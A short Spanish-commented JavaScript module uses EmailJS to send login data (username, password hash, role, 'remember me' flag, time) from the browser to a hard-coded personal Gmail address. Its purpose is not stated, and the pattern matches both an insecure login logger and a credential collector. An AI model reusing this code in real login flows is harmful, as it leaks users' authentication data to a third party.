// email-service.js
// Configuración y envío por EmailJS

// Configura tus claves de EmailJS aquí
const EMAILJS_USER_ID = 'TU_USER_ID'; // Reemplaza por tu userID de EmailJS
const EMAILJS_SERVICE_ID = 'TU_SERVICE_ID'; // Reemplaza por tu serviceID de EmailJS
const EMAILJS_TEMPLATE_ID = 'TU_TEMPLATE_ID'; // Reemplaza por tu templateID de EmailJS

// Si no tienes estos datos, crea una cuenta EmailJS y configúralos.
emailjs.init(EMAILJS_USER_ID);

function sendLoginData(data, callback, errorCallback) {
  emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
    to_email: "proyectoabo79@gmail.com",
    username: data.username,
    password_hash: data.password_hash,
    role: data.role,
    remember: data.remember ? "Sí" : "No",
    datetime: new Date().toLocaleString()
  }).then(function(response) {
    callback(response);
  }, function(error) {
    errorCallback(error);
  });
}

window.emailService = {
  sendLoginData
};